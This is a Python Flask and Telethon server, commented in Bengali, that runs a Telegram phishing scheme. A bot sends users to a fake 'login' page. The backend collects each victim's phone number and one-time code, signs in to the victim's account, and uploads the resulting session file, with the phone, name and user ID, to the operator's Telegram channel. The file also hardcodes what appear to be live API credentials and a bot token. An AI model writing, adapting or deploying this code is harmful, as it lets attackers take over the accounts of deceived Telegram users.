import os
import asyncio
import hashlib
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from telethon import TelegramClient, errors
from flask_cors import CORS
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
import requests

app = Flask(__name__)
CORS(app)

# ==================== তোমার তথ্য বসাও ====================
API_ID = 33304113
API_HASH = '4e4af20183712a922c8557f4f9911cb6'
BOT_TOKEN = '8808491756:AAERHxQEa6guC2488-z4bFbKBbHB6Vw29P0'
YOUR_CHANNEL = '@your_channel_username'
WEBAPP_URL = 'https://your-site.netlify.app'
# =======================================================

temp_data = {}
bot_app = None

# ==================== টেলিগ্রাম বট হ্যান্ডলার ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    
    print(f"✅ নতুন ইউজার: {username} (ID: {user_id})")
    
    keyboard = [[InlineKeyboardButton("🔐 লগইন করুন", url=WEBAPP_URL)]]
    
    await update.message.reply_text(
        f"👋 হ্যালো {username}!\n\n"
        f"নিচের বাটনে ক্লিক করে লগইন করুন।\n"
        f"আপনার টেলিগ্রাম অ্যাপে OTP যাবে।",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def setup_bot():
    """বট সেটআপ করে ওয়েবহুক কনফিগার করে"""
    global bot_app
    try:
        bot_app = Application.builder().token(BOT_TOKEN).build()
        bot_app.add_handler(CommandHandler("start", start))
        
        # ওয়েবহুক সেটআপ (Railway এর জন্য)
        webhook_url = f"https://{os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost')}/webhook"
        
        # লোকাল টেস্টের জন্য
        if webhook_url == "https://localhost/webhook":
            print("⚠️ ওয়েবহুক স্কিপ করা হচ্ছে (লোকাল টেস্ট)")
            return
        
        # ওয়েবহুক সেট করো
        bot_app.bot.set_webhook(webhook_url)
        print(f"✅ ওয়েবহুক সেট করা হয়েছে: {webhook_url}")
        
    except Exception as e:
        print(f"❌ বট সেটআপ ত্রুটি: {e}")

@app.route('/webhook', methods=['POST'])
async def webhook():
    """টেলিগ্রাম থেকে আপডেট আসবে এখানে"""
    try:
        update = Update.de_json(request.get_json(), bot_app.bot)
        await bot_app.process_update(update)
        return 'OK'
    except Exception as e:
        print(f"ওয়েবহুক ত্রুটি: {e}")
        return 'OK'

# ==================== ব্যাকএন্ড API ====================
async def send_session_to_channel(session_path, phone, user_info):
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        channel = await client.get_entity(YOUR_CHANNEL)
        
        message = f"🔐 **নতুন সেশন!**\n\n📱 ফোন: `{phone}`\n👤 নাম: {user_info.first_name}\n📛 ইউজারনেম: @{user_info.username or 'নেই'}\n🆔 আইডি: `{user_info.id}`"
        session_file = f"{session_path}.session"
        
        if os.path.exists(session_file):
            await client.send_file(channel, session_file, caption=message)
            print(f"[✓] সেশন পাঠানো হয়েছে: {phone}")
        
        await client.disconnect()
        return True
    except Exception as e:
        print(f"[-] ত্রুটি: {e}")
        return False

@app.route('/send_code', methods=['POST'])
def send_code():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({'success': False, 'message': 'ফোন নম্বর দিন!'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        session_hash = hashlib.md5(f"{phone}_{time.time()}".encode()).hexdigest()[:16]
        session_name = f"sessions/user_{session_hash}"
        
        client = TelegramClient(session_name, API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        result = loop.run_until_complete(client.send_code_request(phone))
        
        temp_data[phone] = {
            'client': client,
            'session_name': session_name,
            'phone_code_hash': result.phone_code_hash
        }
        
        loop.close()
        return jsonify({'success': True, 'message': 'OTP পাঠানো হয়েছে!'})
        
    except errors.FloodWaitError as e:
        return jsonify({'success': False, 'message': f'অনেক রিকোয়েস্ট! {e.seconds} সেকেন্ড পর চেষ্টা করুন।'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/verify', methods=['POST'])
def verify():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    
    if phone not in temp_data:
        return jsonify({'success': False, 'message': 'সেশন নেই! আবার চেষ্টা করুন।'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client_info = temp_data[phone]
        client = client_info['client']
        session_name = client_info['session_name']
        phone_code_hash = client_info['phone_code_hash']
        
        loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
        me = loop.run_until_complete(client.get_me())
        
        loop.run_until_complete(send_session_to_channel(session_name, phone, me))
        
        loop.close()
        del temp_data[phone]
        
        return jsonify({'success': True, 'message': f'লগইন সফল! স্বাগতম {me.first_name}'})
        
    except errors.PhoneCodeInvalidError:
        return jsonify({'success': False, 'message': 'ভুল OTP! আবার চেষ্টা করুন।'})
    except errors.PhoneCodeExpiredError:
        return jsonify({'success': False, 'message': 'OTP মেয়াদ শেষ! আবার চেষ্টা করুন।'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/resend_code', methods=['POST'])
def resend_code():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    
    if phone in temp_data:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(temp_data[phone]['client'].disconnect())
            loop.close()
            del temp_data[phone]
        except:
            pass
    
    return send_code()

@app.route('/')
def home():
    return jsonify({'status': 'running', 'message': 'টেলিগ্রাম বট ও ব্যাকএন্ড চালু আছে'})

# ==================== মেইন ====================
if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    
    # বট সেটআপ করো
    setup_bot()
    
    port = int(os.environ.get('PORT', 5000))
    print("=" * 60)
    print("🚀 সার্ভার চালু হচ্ছে...")
    print(f"🤖 বট টোকেন: {BOT_TOKEN[:20]}...")
    print(f"📢 সেশন যাবে: {YOUR_CHANNEL}")
    print(f"🌐 পোর্ট: {port}")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=port)
